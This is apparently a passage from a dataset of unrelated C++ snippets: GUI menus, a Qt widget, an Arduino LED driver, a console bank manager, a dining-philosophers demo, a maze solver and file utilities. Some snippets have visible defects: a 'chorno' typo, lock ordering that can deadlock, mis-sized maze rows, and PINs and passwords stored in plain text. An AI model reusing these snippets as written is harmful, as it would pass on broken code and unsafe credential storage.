+ std::to_string(i + 1) + \"/\" + std::to_string(conf.nb_alt) + \")\");\n        logger(\"processing landmark \" + std::to_string(nl) +\n            \" (\" + std::to_string(i + 1) + \"/\" + std::t",
    "/*\n*\n*\tMegan Grass\n*\tDecember 14, 2024\n*\n*/\n\n#include \"app.h\"\n\nvoid Global_Application::MainMenu(void)\n{\n\tbool b_MenuPixelEnabled = false;\n\tif (m_Texture && !m_Texture->GetPixels().empty())\n\t{\n\t\tb_MenuPixelEnabled = true;\n\t}\n\n\tbool b_MenuPaletteEnabled = false;\n\tif (m_Texture && !m_Texture->GetPalette().empty())\n\t{\n\t\tb_MenuPaletteEnabled = true;\n\t}\n\n\tif (ImGui::BeginMainMenuBar())\n\t{\n\t\tif (ImGui::BeginMenu(\"File##MenuWindow\"))\n\t\t{\n\t\t\tif (ImGui::MenuItem(\"Open##FileMenu\", \"CTRL+O\"))\n\t\t\t{\n\t\t\t\tOpen();\n\t\t\t}\n\t\t\tImGui::Separator();\n\t\t\tif (ImGui::MenuItem(\"Create##FileMenu\", \"CTRL+N\"))\n\t\t\t{\n\t\t\t\tCreateModalFunc = [this]()\n\t\t\t\t\t{\n\t\t\t\t\t\tCreateModal();\n\t\t\t\t\t};\n\t\t\t}\n\t\t\tImGui::Separator();\n\t\t\tif (ImGui::MenuItem(\"Save As##FileMenu\", \"CTRL+S\", nullptr, (b_MenuPixelEnabled || b_MenuPaletteEnabled)))\n\t\t\t{\n\t\t\t\tSaveAs();\n\t\t\t}\n\t\t\tImGui::Separator();\n\t\t\tif (ImGui::BeginMenu(\"Delete\", m_Texture ? true : false))\n\t\t\t{\n\t\t\t\tif (ImGui::MenuItem(\"Palette (Current)##FileMenuDelete\", NULL, nullptr, b_MenuPaletteEnabled))\n\t\t\t\t{\n\t\t\t\t\tDeletePalette(m_Palette);\n\t\t\t\t}\n\n\t\t\t\tif (ImGui::MenuItem(\"Palette (All)##FileMenuDelete\", NULL, nullptr, b_MenuPaletteEnabled))\n\t\t\t\t{\n\t\t\t\t\tDeleteAllPalettes();\n\t\t\t\t}\n\n\t\t\t\tImGui::Separator();\n\n\t\t\t\tif (ImGui::MenuItem(\"Pixels##FileMenuDelete\", NULL, nullptr, b_MenuPixelEnabled))\n\t\t\t\t{\n\t\t\t\t\tDeleteAllPixels();\n\t\t\t\t}\n\n\t\t\t\tImGui::EndMenu();\n\t\t\t}\n\t\t\tImGui::Separator();\n\t\t\tif (ImGui::MenuItem(\"Export All##FileMenu\", NULL, nullptr, m_Files.size() > 1 ? true : false))\n\t\t\t{\n\t\t\t\tExportAllTextures();\n\t\t\t}\n\t\t\tif (ImGui::MenuItem(\"Export All As Bitmap##FileMenu\", NULL, nullptr, m_Files.size() > 1 ? true : false))\n\t\t\t{\n\t\t\t\tExportAllTexturesToBitmap();\n\t\t\t}\n\t\t\tImGui::Separator();\n\t\t\tif (ImGui::BeginMenu(\"Export\", (b_MenuPixelEnabled || b_MenuPaletteEnabled)))\n\t\t\t{\n\t\t\t\tif (ImGui::MenuItem(\"Palette (Current)##FileMenuExport\", NULL, nullptr, b_MenuPaletteEnabled))\n\t\t\t\t{\n\t\t\t\t\tExportPalette(m_Palette);\n\t\t\t\t}\n\t\t\t\tif (ImGui::MenuItem(\"Palette (All)##FileMenuExport\", NULL, nullptr, b_MenuPaletteEnabled))\n\t\t\t\t{\n\t\t\t\t\tExportPalette();\n\t\t\t\t}\n\t\t\t\tif (ImGui::MenuItem(\"Palette As PAL##FileMenuExport\", NULL, nullptr, b_MenuPaletteEnabled))\n\t\t\t\t{\n\t\t\t\t\tExportPaletteToPAL();\n\t\t\t\t}\n\t\t\t\tif (ImGui::MenuItem(\"Palette As TIM##FileMenuExport\", NULL, nullptr, b_MenuPaletteEnabled))\n\t\t\t\t{\n\t\t\t\t\tExportPaletteToTIM();\n\t\t\t\t}\n\t\t\t\tImGui::Separator();\n\t\t\t\tif (ImGui::MenuItem(\"Pixels##FileMenuExport\", NULL, nullptr, b_MenuPixelEnabled))\n\t\t\t\t{\n\t\t\t\t\tExportPixels();\n\t\t\t\t}\n\t\t\t\tif (ImGui::MenuItem(\"Pixels As TIM##FileMenuExport\", NULL, nullptr, b_MenuPixelEnabled))\n\t\t\t\t{\n\t\t\t\t\tExportPixelsToTIM();\n\t\t\t\t}\n\t\t\t\tImGui::EndMenu();\n\t\t\t}\n\t\t\tif (ImGui::BeginMenu(\"Import\", m_Texture ? true : false))\n\t\t\t{\n\t\t\t\tif (ImGui::MenuItem(\"Palette (Current)##FileMenuImport\", NULL, nullptr, m_Texture ? true : false))\n\t\t\t\t{\n\t\t\t\t\tImportPalette(m_Palette);\n\t\t\t\t}\n\t\t\t\tif (ImGui::MenuItem(\"Palette (All)##FileMenuExport\", NULL, nullptr, m_Texture ? true : false))\n\t\t\t\t{\n\t\t\t\t\tImportPalette();\n\t\t\t\t}\n\t\t\t\tif (ImGui::MenuItem(\"Palette From PAL##FileMenuExport\", NULL, nullptr, m_Texture ? true : false))\n\t\t\t\t{\n\t\t\t\t\tImportPaletteFromPAL();\n\t\t\t\t}\n\t\t\t\tif (ImGui::MenuItem(\"Palette From TIM##FileMenuImport\", NULL, nullptr, m_Texture ? true : false))\n\t\t\t\t{\n\t\t\t\t\tImportPaletteFromTIM();\n\t\t\t\t}\n\t\t\t\tImGui::Separator();\n\t\t\t\tif (ImGui::MenuItem(\"Pixels##FileMenuImport\", NULL, nullptr, (b_MenuPixelEnabled || b_MenuPaletteEnabled)))\n\t\t\t\t{\n\t\t\t\t\tImportPixels();\n\t\t\t\t}\n\t\t\t\tif (ImGui::MenuItem(\"Pixels From TIM##FileMenuImport\", NULL, nullptr, m_Texture ? true : false))\n\t\t\t\t{\n\t\t\t\t\tImportPixelsFromTIM();\n\t\t\t\t}\n\t\t\t\tImGui::EndMenu();\n\t\t\t}\n\t\t\tImGui::Separator();\n\t\t\tif (ImGui::MenuItem(\"Close##FileMenu\", NULL, nullptr, DXTexture ? true : false))\n\t\t\t{\n\t\t\t\tClose();\n\t\t\t}\n\t\t\tImGui::Separator();\n\t\t\tif (ImGui::MenuItem(\"Exit##FileMenu\", \"ESC\"))\n\t\t\t{\n\t\t\t\tb_ForceShutdown = true;\n\t\t\t}\n\t\t\tImGui::EndMenu();\n\t\t}\n\n\t\tif (ImGui::BeginMenu(\"View##MenuWindow\"))\n\t\t{\n\t\t\tif (ImGui::MenuItem(\"Fullscreen##ViewMenu\", \"F11\"))\n\t\t\t{\n\t\t\t\tWindow->AutoFullscreen();\n\t\t\t}\n\t\t\tImGui::Separator();\n\t\t\tImGui::MenuItem(\"Window Options##ViewMenu\", NULL, &b_ViewWindowOptions);\n\t\t\tImGui::Separator();\n\t\t\tImGui::MenuItem(\"Image Options##ViewMenu\", NULL, &b_ViewImageOptions);\n\t\t\tImGui::MenuItem(\"Palette Editor##ViewMenu\", NULL, &b_ViewPaletteWindow, m_Texture ? true : false);\n\t\t\tImGui::MenuItem(\"File Properties##ViewMenu\", NULL, &b_ViewFileWindow, m_Files.empty() ? false : true);\n\t\t\tImGui::Separator();\n\t\t\tImGui::MenuItem(\"Bitstream Options##ViewMenu\", NULL, &b_ViewBitstreamOptions);\n\t\t\tImGui::Separator();\n\t\t\tif (ImGui::MenuItem(\"Next Palette##ViewMenu\", \"RIGHT\", nullptr, b_MenuPaletteEnabled))\n\t\t\t{\n\t\t\t\tSetPalette(++m_Palette);\n\t\t\t}\n\t\t\tif (ImGui::MenuItem(\"Prev Palette##ViewMenu\", \"LEFT\", nullptr, b_MenuPaletteEnabled))\n\t\t\t{\n\t\t\t\tSetPalette(--m_Palette);\n\t\t\t}\n\t\t\tif (ImGui::MenuItem(\"Next Image##ViewMenu\", \"DOWN\", nullptr, m_Files.size() > 1 ? true : false))\n\t\t\t{\n\t\t\t\tSetTexture(++m_SelectedFile);\n\t\t\t}\n\t\t\tif (ImGui::MenuItem(\"Prev Image##ViewMenu\", \"UP\", nullptr, m_Files.s",
    "#include \"YareScrean.h\"\n#include <QDropEvent>\n#include <QDragEnterEvent>\n#include <QMimeData>\n#include <QClipboard>\n#include <QApplication>\n#include <QHBoxLayout>\n#include <QDebug>\n#include <QFileDialog>\n#include <QMessageBox>\n#include <QDir>\n#include <QStandardPaths>\n#include <QScrollArea>\n\n// DropWidget implementation\nDropWidget::DropWidget(QWidget* parent)\n    : QWidget(parent), PathToFile(\"\") {\n    setAcceptDrops(true);\n\n    imageLabel = new QLabel(\"Open your image here\", this);\n    imageLabel->setAlignment(Qt::AlignCenter);\n    imageLabel->setStyleSheet(\"border: 2px dashed gray; padding: 10px; color: gray; font-family: Lucida Console\");\n    imageLabel->setFixedSize(420, 120);\n}\n\nvoid DropWidget::dragEnterEvent(QDragEnterEvent* event) {\n    if (event->mimeData()->hasUrls() || event->mimeData()->hasImage()) {\n        event->acceptProposedAction();\n    }\n}\n\nvoid DropWidget::dropEvent(QDropEvent* event) {\n    if (event->mimeData()->hasUrls()) {\n        PathToFile = event->mimeData()->urls().first().toLocalFile();\n        emit filePathChanged(PathToFile); // Emit signal with the file path\n    }\n}\n\nvoid DropWidget::keyPressEvent(QKeyEvent* event) {\n    if (event->modifiers() == Qt::ControlModifier && event->key() == Qt::Key_V) {\n        const QClipboard* clipboard = QApplication::clipboard();\n        const QMimeData* mimeData = clipboard->mimeData();\n        if (mimeData->hasImage()) {\n            QPixmap pixmap = qvariant_cast<QPixmap>(mimeData->imageData());\n            imageLabel->setPixmap(pixmap.scaled(200, 200, Qt::KeepAspectRatio));\n            imageLabel->setText(\"\");\n        }\n    }\n    QWidget::keyPressEvent(event);\n}\n\nvoid DropWidget::onSelectButton() {\n    imageLabel->setText(\"Wait...\");\n    QString filter = \"Images (*.png *.jpg *.jpeg *.bmp *.gif)\";\n    QString imagesDir = QStandardPaths::writableLocation(QStandardPaths::PicturesLocation);\n\n    QString fileName = QFileDialog::getOpenFileName(nullptr,\n        \"Select an Image\",\n        imagesDir,\n        filter);\n    if (!fileName.isEmpty()) {\n        PathToFile = fileName;\n        emit filePathChanged(PathToFile);\n        imageLabel->setText(\"Image Selected\");\n    }\n    else {\n        imageLabel->setText(\"Open your image here\");\n    }\n}\n\nvoid DropWidget::onClearSelected() {\n    PathToFile.clear();\n    imageLabel->setText(\"Open your image here\");\n    emit clearTextLabel(); // Emit signal to clear text label\n}\n\nvoid DropWidget::onCopyText(const QString& text) {\n    QClipboard* clipboard = QApplication::clipboard();\n    clipboard->setText(text); // Copy text to clipboard\n}\n\n// YareScrean implementation\nYareScrean::YareScrean(QWidget* parent)\n    : QMainWindow(parent), dropWidget(new DropWidget(this)), TextLabel(new QLabel(this)) {\n\n    QWidget* mainWidget = new QWidget(this);\n    setCentralWidget(mainWidget);\n\n    dropWidget->setObjectName(\"dropWidget\");\n\n    QPushButton* chooseFile = new QPushButton(\"Choose\", this);\n    QObject::connect(chooseFile, &QPushButton::clicked, dropWidget, &DropWidget::onSelectButton);\n\n    QPushButton* clearText = new QPushButton(\"Clear\", this);\n    QObject::connect(clearText, &QPushButton::clicked, dropWidget, &DropWidget::onClearSelected);\n\n    QPushButton* copyText = new QPushButton(\"Copy Text\", this);\n    QObject::connect(copyText, &QPushButton::clicked, this, [this]() {\n        dropWidget->onCopyText(TextLabel->text());\n        });\n\n    dropWidget->setFixedSize(500, 120);\n    copyText->setFixedSize(150, 35);\n    chooseFile->setFixedSize(150, 35);\n    clearText->setFixedSize(150, 35);\n\n    TextLabel->setStyleSheet(\"border: 2px solid gray; padding: 1px; color:black\");\n    TextLabel->setAlignment(Qt::AlignLeft | Qt::AlignTop);\n    TextLabel->setWordWrap(true);\n\n    QScrollArea* scrollArea = new QScrollArea(this);\n    scrollArea->setWidget(TextLabel);\n    scrollArea->setWidgetResizable(true);\n    scrollArea->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOn);\n    scrollArea->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);\n\n    QVBoxLayout* layoutUpSide = new QVBoxLayout();\n    layoutUpSide->addWidget(chooseFile);\n    layoutUpSide->addWidget(clearText);\n    layoutUpSide->addWidget(copyText);\n\n    QHBoxLayout* layoutUp = new QHBoxLayout();\n    layoutUp->addWidget(dropWidget, 1);\n    layoutUp->addLayout(layoutUpSide, 5);\n\n    QVBoxLayout* layoutMain = new QVBoxLayout();\n    layoutMain->addLayout(layoutUp, 1);\n    layoutMain->addWidget(scrollArea, 2);\n\n    mainWidget->setLayout(layoutMain);\n\n    // Window settings\n    setFixedSize(600, 500);\n    setWindowTitle(\"YareScrean\");\n\n    connect(dropWidget, &DropWidget::clearTextLabel, this, &YareScrean::clearTextLabel);\n}\n\nvoid YareScrean::clearTextLabel() {\n    TextLabel->clear(); // Clear the text in TextLabel\n}\n\nYareScrean::~YareScrean() {}",
    "#include <Arduino.h>\n#include <Base64.hpp>\n\n#ifdef __AVR__\n#define PIN_SIN_1  2\n#define PIN_SIN_2  3\n#define PIN_SIN_3  4\n#define PIN_CLOCK  5\n#define PIN_LATCH  6\n#define PIN_STROBE 7\n#endif\n\n#ifdef __RP2040__\n#define PIN_SIN_1  0\n#define PIN_SIN_2  1\n#define PIN_SIN_3  2\n#define PIN_CLOCK  3\n#define PIN_LATCH  4\n#define PIN_STROBE 5\n#endif\n\nstatic uint16_t matrix_buffer[4*2][16];\n\n#define SIZE_RECV_BUFF 1024\nstatic uint8_t recv_buff[SIZE_RECV_BUFF];\nstatic uint16_t p_recv_buff = 0;\n\n#define BASE64_BUFF_SIZE 768\nstatic uint8_t base64_buff[BASE64_BUFF_SIZE];\n\nvoid setup() {\n  Serial.begin(921600);\n}\n\nvoid setup1(){\n  pinMode(PIN_SIN_1, OUTPUT);\n  pinMode(PIN_SIN_2, OUTPUT);\n  pinMode(PIN_SIN_3, OUTPUT);\n  pinMode(PIN_CLOCK, OUTPUT);\n  pinMode(PIN_LATCH, OUTPUT);\n  pinMode(PIN_STROBE, OUTPUT);\n  digitalWrite(PIN_STROBE, HIGH);\n\n  for (int x=0; x<8; x++) {\n    for (int y=0; y<16; y++) {\n      matrix_buffer[x][y] = 0x0000;\n    }\n  }\n}\n\nvoid loop() {\n  for (int x=0; x<16; x++) {\n    digitalWrite(PIN_STROBE, HIGH);\n    digitalWrite(PIN_LATCH, HIGH);//Latch\u3092HIGH\n    for (int panel=0; panel<4; panel++) {\n      uint16_t sin2 = matrix_buffer[2*(3-panel)+0][x];\n      uint16_t sin3 = matrix_buffer[2*(3-panel)+1][x];\n      for (int y=0; y<16; y++) {\n        digitalWrite(PIN_CLOCK, LOW); //clock\n        digitalWrite(PIN_SIN_1, x==y? HIGH: LOW);\n        digitalWrite(PIN_SIN_2, sin2&1? HIGH: LOW);\n        digitalWrite(PIN_SIN_3, sin3&1? HIGH: LOW);\n        digitalWrite(PIN_CLOCK, HIGH);//clock\n        sin2 = sin2 >> 1;\n        sin3 = sin3 >> 1;\n      }\n    }\n    digitalWrite(PIN_LATCH, LOW); //Latch low \u66f8\u304d\u8fbc\u307f\n    delayMicroseconds(1);\n    digitalWrite(PIN_STROBE, LOW); //STLOBE HIGH\n    delayMicroseconds(1);\n\n    delayMicroseconds(100);\n  }\n}\n\nvoid loop1() {\n  while (Serial.available()){\n    uint8_t temp = Serial.read();\n    recv_buff[p_recv_buff] = temp;\n    if (temp == '\\r') {\n      // Ignore \n    }\n    else if (temp == '\\n') {\n      // Convert to base64 to binary\n      int b64_len = decode_base64_length(recv_buff);\n      if (b64_len == 256) {\n        decode_base64(recv_buff, base64_buff);\n        memcpy(&matrix_buffer[0][0], &base64_buff[0], 256);\n      }\n      p_recv_buff = 0;\n      memset(&recv_buff[0], 0x00, SIZE_RECV_BUFF);\n      memset(&base64_buff[0], 0x00, BASE64_BUFF_SIZE);\n    } else {\n      p_recv_buff++;\n      if (p_recv_buff >= SIZE_RECV_BUFF) p_recv_buff = SIZE_RECV_BUFF - 1;\n    }\n  } \n}",
    "#include <iostream>\n#include <string>\n#include <iomanip>\n#include <vector>\n#include <fstream>\n\nusing namespace std;\n\nstring FileName = \"Clients.txt\";\n\nstring UsersFile = \"Users.txt\";\n\nstruct stClientData {\n    string AccountNumber = \"\";\n    string PinCode = \"\";\n    string Name = \"\";\n    string PhoneNumber = \"\";\n    double AccountBalance = 0.0;\n    bool MarkForDelete = false;\n};\n\nstruct stUserData {\n    string UserName = \"\";\n    string Password = \"\";\n    int Permissions = 0;\n    bool MarkForDelete = false;\n};\n\nstUserData CurrentUser;\n\nenum enMainMenueFunctions {clientList = 1, addClient = 2, deleteClient = 3, updateClient = 4, findClient = 5, transactios = 6, manageUsers = 7, logout = 8};\n\nenum enTransactionsMenueFunctions {deposit = 1, withdraw = 2, totalBalances = 3, mainMenue = 4};\n\nenum enManageUsersMenueFunctions {listUsers = 1, addUser = 2, deleteUser = 3, updateUser = 4, findUser = 5, MainMenue = 6};\n\nenum enMainMenuePermissions {\n    eAll = -1, pListClients = 1, pAddNewClient = 2, pDeleteClient\n    = 4,\n    pUpdateClients = 8, pFindClient = 16, pTranactions = 32,\n    pManageUsers = 64\n};\n\nvoid StartApp();\nvoid Login();\n\nstring ReadString(string Message)\n{\n    string Text = \"\";\n    cout << Message;\n    getline(cin >> ws, Text);\n    return Text;\n}\n\ndouble ReadNumber(string Message)\n{\n    double Number = 0;\n    cout << Message;\n    cin >> Number;\n    return Number;\n}\n\nvector<string> Split(string Text, string Delim = \"#//#\")\n{\n    vector<string> Result;\n    short Pos = 0;\n    string Word;\n    while ((Pos = Text.find(Delim)) != string::npos)\n    {\n        Word = Text.substr(0, Pos);\n        if (Word != \"\")\n            Result.push_back(Word);\n        Text.erase(0, Pos + Delim.size());\n    }\n    if (Text != \"\")\n        Result.push_back(Text);\n\n    return Result;\n}\n\nstClientData ConvertOneLineToStruct(vector<string> DataLine)\n{\n    stClientData NewClient;\n    NewClient.AccountNumber = DataLine[0];\n    NewClient.PinCode = DataLine[1];\n    NewClient.Name = DataLine[2];\n    NewClient.PhoneNumber = DataLine[3];\n    NewClient.AccountBalance = stod(DataLine[4]);\n    return NewClient;\n}\n\nvector<stClientData> LoadClientsData(string FileName)\n{\n    vector<stClientData> vClients;\n    fstream ClientsFile;\n    ClientsFile.open(FileName, ios::in);\n    if (ClientsFile.is_open())\n    {\n        string Line = \"\";\n        stClientData Client;\n        while (getline(ClientsFile, Line))\n        {\n            Client = ConvertOneLineToStruct(Split(Line));\n            vClients.push_back(Client);\n        }\n        ClientsFile.close();\n    }\n    return vClients;\n}\n\nvoid PrintClientData(stClientData Client)\n{\n    cout << \"| \" << setw(15) << left << Client.AccountNumber;\n    cout << \"| \" << setw(10) << left << Client.PinCode;\n    cout << \"| \" << setw(40) << left << Client.Name;\n    cout << \"| \" << setw(12) << left << Client.PhoneNumber;\n    cout << \"| \" << setw(12) << left << Client.AccountBalance;\n}\n\nvoid PrintClientsData(vector<stClientData> vClients)\n{\n    for (stClientData& Client : vClients)\n    {\n        PrintClientData(Client);\n        cout << endl;\n    }\n}\n\nbool CheckAccountNumberExist(vector<stClientData> vClients, string AccountNumber)\n{\n    for (stClientData& Client : vClients)\n    {\n        if (Client.AccountNumber == AccountNumber)\n            return true;\n    }\n    return false;\n}\n\nbool CheckUserNameAndPassword(vector<stUserData> vUsers, string UserName, string Password, stUserData& CurrentUser)\n{\n    for (stUserData& User : vUsers)\n    {\n        if (User.UserName == UserName && User.Password == Password)\n        {\n            CurrentUser = User;\n            return true;\n        }\n    }\n    return false;\n}\n\nstClientData ReadNewClient()\n{\n    stClientData NewClient;\n    vector<stClientData> vClients = LoadClientsData(FileName);\n    bool accountExists;\n\n    do\n    {\n        NewClient.AccountNumber = ReadString(\"Enter Account Number? \");\n        accountExists = CheckAccountNumberExist(vClients, NewClient.AccountNumber);\n        if (accountExists)\n        {\n            cout << \"\\nClient with [\" << NewClient.AccountNumber << \"] already exists!\\n\\n\";\n        }\n    } while (accountExists);\n\n    NewClient.PinCode = ReadString(\"Enter PinCode? \");\n    NewClient.Name = ReadString(\"Enter Name? \");\n    NewClient.PhoneNumber = ReadString(\"Enter Phone? \");\n    NewClient.AccountBalance = ReadNumber(\"Enter AccountBalance? \");\n\n    return NewClient;\n}\n\nstring ConvertClientDataToString(stClientData ClientData, string Separator = \"#//#\")\n{\n    string Result = \"\";\n    Result += ClientData.AccountNumber + Separator;\n    Result += ClientData.PinCode + Separator;\n    Result += ClientData.Name + Separator;\n    Result += ClientData.PhoneNumber + Separator;\n    Result += to_string(ClientData.AccountBalance);\n    return Result;\n}\n\nvoid SaveNewClientToFile(string FileName, string ClientData)\n{\n    fstream ClientsFile;\n    ClientsFile.open(FileName, ios::out | ios::app);\n    if (ClientsFile.is_open())\n    {\n        ClientsFile << ClientData << endl;\n",
    "#include <iostream>\n#include <thread>\n#include <mutex>\n#include <chrono>\nusing namespace std;\n\nconst int N = 5; // Number of philosophers\nmutex forks[N]; // Mutexes representing forks\n\nvoid philosopher(int id) {\n  while (true) {\n  // Thinking\n    cout << \"Philosopher \" << id << \" is thinking.\\n\";\n    this_thread::sleep_for(chrono::seconds(1));\n    // Picking up left fork\n    forks[id].lock();\n    cout << \"Philosopher \" << id << \" picked up left fork.\\n\";\n    \n    // Picking up right fork\n    forks[(id + 1) % N].lock();\n    cout << \"Philosopher \" << id << \" picked up right fork.\\n\";\n    cout << \"Philosopher \" << id << \" is eating.\\n\";\n\n    this_thread::sleep_for(chorno::seconds(2));\n    forks[(id + 1) % N].unlock();\n    cout << \"Philosopher \" << id << \" put down right fork.\\n\";\n\n    forks[id].unlock();\n    cout << \"Philosopher \" << id << \" put down left fork.\\n\";\n  }\n}\nint main(){\n  thread philosophers[N];\n  \n  for(int i = 0; i < N; i++){\n    philosophers[i] = thread(philosopher, i);\n  }\n\n  for(int i = 0; i < N; i++){\n    philosophers[i].join();\n  }\n\n  return 0;\n}\n",
    "#include <iostream>\nusing namespace std;\n\n#define ROWS 10\n#define COLS 17\n\nclass MazeSolver {\nprivate:\nchar maze[ROWS][COLS];\n\nvoid initializeMaze() {\nconst char tempMaze[ROWS][COLS] = {\n\"OOOOOOOOOOOOOOOO\",\n\"O O O OOO O OO \",\n\"O O \",\n\"O O OOOOOOO O O \",\n\"O O O O O \",\n\"O OOO OO OOOO \",\n\"O O O O \",\n\"OO O O O OOO OO \",\n\"OO O O O \",\n\"OOOOOOOOOOOOOOOO\"\n};\n\nfor (int i = 0; i < ROWS; i++) {\nfor (int j = 0; j < COLS; j++) {\nmaze[i][j] = tempMaze[i][j];\n}\n}\n}\n\nbool solveRecursive(int row, int col) {\nif (row == 8 && col == 13) {\nmaze[row][col] = '*';\nreturn true;\n}\n\nif (maze[row][col] != ' ') return false;\n\nmaze[row][col] = '*';\n\nif (solveRecursive(row, col + 1)) return true;\nif (solveRecursive(row + 1, col)) return true;\nif (solveRecursive(row, col - 1)) return true;\nif (solveRecursive(row - 1, col)) return true;\n\nmaze[row][col] = 'D';\nreturn false;\n}\npublic:\nMazeSolver() {\ninitializeMaze();\n}\n\nvoid printMaze() {\nfor (int i = 0; i < ROWS; i++) {\nfor (int j = 0; j < COLS - 1; j++) {\ncout << maze[i][j];\n}\ncout << endl;\n}\n}\n\nbool solve() {\nreturn solveRecursive(1, 1);\n}\n};\n\nint main() {\nMazeSolver solver;\n\ncout << \"Here's the maze. Let's find a way out!\" << endl;\nsolver.printMaze();\n\nif (solver.solve()) {\ncout << \"\\nYay! We made it through. Here's the solution:\" << endl;\nsolver.printMaze();\n} else {\ncout << \"\\nNo way out of this maze. We're stuck!\" << endl;\n}\n\nreturn 0;\n}\n",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\nstruct Node {\n    string data;\n    Node* next;\n    Node* prev;\n\n    Node(string value) : data(value), next(nullptr), prev(nullptr) {}\n};\n\nclass DoublyLinkedList {\nprivate:\n    Node* head;\n    Node* tail;\n\npublic:\n    DoublyLinkedList() : head(nullptr), tail(nullptr) {}\n\n    void insert(string value) {\n        Node* newNode = new Node(value);\n        if (!head) {\n            head = tail = newNode;\n        } else {\n            tail->next = newNode;\n            newNode->prev = tail;\n            tail = newNode;\n        }\n    }\n    void displayBackward() {\n        Node* current = tail;\n        cout << \"The strings backward are: \";\n        while (current) {\n            cout << current->data << \" \";\n            current = current->prev;\n        }\n        cout << endl;\n    }\n    ~DoublyLinkedList() {\n        Node* current = head;\n        while (current) {\n            Node* nextNode = current->next;\n            delete current;\n            current = nextNode;\n        }\n    }\n};\n\nint main() {\n    DoublyLinkedList list;\n    string input;\n    cout << \"Enter strings (type 'exit' to finish):\" << endl;\n    while (true) {\n        getline(cin, input);\n        if (input == \"exit\") break;\n        list.insert(input);\n    }\n    list.displayBackward();\n    return 0;\n}\n",
    "// Author: Jake Rieger\n// Created: 12/12/24.\n//\n\n#include \"Filesystem.hpp\"\n#include <sstream>\n\n#ifdef _WIN32\n    // Windows does not define the S_ISREG and S_ISDIR macros in stat.h, so we do.\n    // We have to define _CRT_INTERNAL_NONSTDC_NAMES 1 before #including sys/stat.h\n    // in order for Microsoft's stat.h to define names like S_IFMT, S_IFREG, and S_IFDIR,\n    // rather than just defining  _S_IFMT, _S_IFREG, and _S_IFDIR as it normally does.\n    #define _CRT_INTERNAL_NONSTDC_NAMES 1\n    #define WIN32_LEAN_AND_MEAN\n    #define NOMINMAX\n    #include <Windows.h>\n    #include <sys/stat.h>\n    #if !defined(S_ISREG) && defined(S_IFMT) && defined(S_IFREG)\n        #define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)\n    #endif\n    #if !defined(S_ISDIR) && defined(S_IFMT) && defined(S_IFDIR)\n        #define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)\n    #endif\n#else\n    #include <sys/stat.h>\n#endif\n\nnamespace x::Filesystem {\n#pragma region FileReader\n    std::vector<u8> FileReader::readAllBytes(const str& path) {\n        std::ifstream file(path, std::ios::binary | std::ios::ate);\n        if (!file.is_open()) { return {}; }\n        const std::streamsize fileSize = file.tellg();\n        std::vector<u8> bytes(fileSize);\n        file.seekg(0, std::ios::beg);\n        if (!file.read(reinterpret_cast<char*>(bytes.data()), fileSize)) { return {}; }\n        file.close();\n        return bytes;\n    }\n\n    str FileReader::readAllText(const str& path) {\n        const std::ifstream file(path);\n        if (!file.is_open()) { return {}; }\n        std::stringstream buffer;\n        buffer << file.rdbuf();\n        return buffer.str();\n    }\n\n    std::vector<str> FileReader::readAllLines(const str& path) {\n        std::ifstream file(path);\n        std::vector<str> lines;\n        if (!file.is_open()) { return {}; }\n        str line;\n        while (std::getline(file, line)) {\n            lines.push_back(line);\n        }\n        return lines;\n    }\n\n    std::vector<u8> FileReader::readBlock(const str& path, size_t size, u64 offset) {\n        std::ifstream file(path, std::ios::binary | std::ios::ate);\n        if (!file) { return {}; }\n        const std::streamsize fileSize = file.tellg();\n        if (offset >= (u64)fileSize || size == 0 || offset + size > (u64)fileSize) { return {}; }\n        file.seekg((std::streamsize)offset, std::ios::beg);\n        if (!file) { return {}; }\n        std::vector<u8> buffer(size);\n        file.read(reinterpret_cast<char*>(buffer.data()), (std::streamsize)size);\n        if (!file) { return {}; }\n        return buffer;\n    }\n\n    size_t FileReader::queryFileSize(const str& path) {\n        std::ifstream file(path, std::ios::binary | std::ios::ate);\n        if (!file.is_open()) { return 0; }\n        const std::streamsize fileSize = file.tellg();\n        return fileSize;\n    }\n#pragma endregion\n\n#pragma region FileWriter\n    bool FileWriter::writeAllBytes(const str& path, const std::vector<u8>& data) {\n        std::ofstream file(path,\n                           std::ios::binary | std::ios::trunc);  // Overwrite existing file\n        if (!file) return false;\n        file.write(RCAST<const char*>(data.data()), CAST<std::streamsize>(data.size()));\n        return file.good();\n    }\n\n    bool FileWriter::writeAllText(const str& path, const str& text) {\n        std::ofstream file(path, std::ios::out | std::ios::trunc);\n        if (!file) return false;\n        file << text;\n        return file.good();\n    }\n\n    bool FileWriter::writeAllLines(const str& path, const std::vector<str>& lines) {\n        std::ofstream file(path, std::ios::out | std::ios::trunc);\n        if (!file) return false;\n        for (const auto& line : lines) {\n            file << line << '\\n';\n            if (!file.good()) { return false; }\n        }\n        return file.good();\n    }\n\n    bool FileWriter::writeBlock(const str& path, const std::vector<u8>& data, u64 offset) {\n        std::ofstream file(path,\n                           std::ios::binary | std::ios::in |\n                             std::ios::out);  // Open in binary read/write mode\n        if (!file) return false;\n        file.seekp(CAST<std::streampos>(offset), std::ios::beg);  // seek to offset\n        if (!file) return false;                                  // Failed to seek\n        file.write(RCAST<const char*>(data.data()), CAST<std::streamsize>(data.size()));\n        return file.good();\n    }\n\n    std::future<std::vector<u8>> AsyncFileReader::readAllBytes(const str& path) {\n        return runAsync([path]() { return FileReader::readAllBytes(path); });\n    }\n\n    std::future<str> AsyncFileReader::readAllText(const str& path) {\n        return runAsync([path]() { return FileReader::readAllText(path); });\n    }\n\n    std::future<std::vector<str>> AsyncFileReader::readAllLines(const str& path) {\n        return runAsync([path]() { return FileReader::readAllLines(path); });\n    }\n\n    std::future<std::vector<u8>>\n    AsyncFileReader::readBlock(const str& path, size_t size, u64 offset) {\n  ",
